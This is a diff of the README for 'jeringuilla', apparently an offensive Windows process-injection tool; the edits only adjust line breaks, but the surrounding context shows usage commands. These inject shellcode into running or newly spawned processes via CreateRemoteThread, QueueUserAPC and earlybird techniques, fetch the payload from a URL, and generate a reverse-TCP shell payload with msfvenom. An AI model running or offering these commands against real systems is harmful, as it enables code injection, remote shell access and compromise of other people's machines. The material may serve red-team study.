@@ -23,8 +23,9 @@ jeringuilla is a tool for easy process injection. It implements several types of
 
 Link: [https://github.com/ricardojoserf/jeringuilla](https://github.com/ricardojoserf/jeringuilla)
 
+<br>
 --------------------------------------
-<br><br><br>
+<br>
 
 ## List process
 
@@ -48,8 +49,10 @@ jeringuilla.exe list "DESKTOP-MA54241\ricardo"
 ```
 ![img1](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jeringa/Screenshot_1.png)
 
+<br>
 --------------------------------------
-<br><br><br>
+<br>
+
 
 ##  Injection type "inject-crt" (OpenProcess + VirtualAllocEx + WriteProcessMemory + CreateRemoteThread)
 
@@ -74,8 +77,10 @@ jeringuilla.exe inject-crt 9408 http://127.0.0.1/payload.bin
 ```
 ![img3](https://raw.githubusercontent.com/ricardojoserf/ricardojoserf.github.io/master/images/jeringa/Screenshot_3.png)
 
+<br>
 --------------------------------------
-<br><br><br>
+<br>
+
 
 
 ##  Injection type "inject-apc" (OpenProcess + VirtualAllocEx + WriteProcessMemory + OpenThread + QueueUserAPC)
@@ -100,9 +105,10 @@ Example - Injection using PID and a url to download the payload:
 jeringuilla.exe inject-apc 1234 http://127.0.0.1/payload.bin
 ```
 
-
+<br>
 --------------------------------------
-<br><br><br>
+<br>
+
 
 ##  Injection type "earlybird" (CreateProcess + VirtualAllocEx + WriteProcessMemory + ResumeThread)
 
@@ -126,8 +132,10 @@ Example - Injection using program path and a url to download the payload:
 jeringuilla.exe earlybird "c:\windows\system32\calc.exe" http://127.0.0.1/payload.bin
 ```
 
+<br>
 --------------------------------------
-<br><br><br>
+<br>
+
 
 ## Payload generation
 
@@ -145,8 +153,10 @@ Example - Create payload in RAW format for url option using Msfvenom with:
 msfvenom -p windows/x64/shell_reverse_tcp LHOST=127.0.0.1 LPORT=4444 EXITFUNC=thread -f raw > payload.bin
 ```
 
+<br>
 --------------------------------------
-<br><br><br>
+<br>
+
 
 ## AES Encryption
 
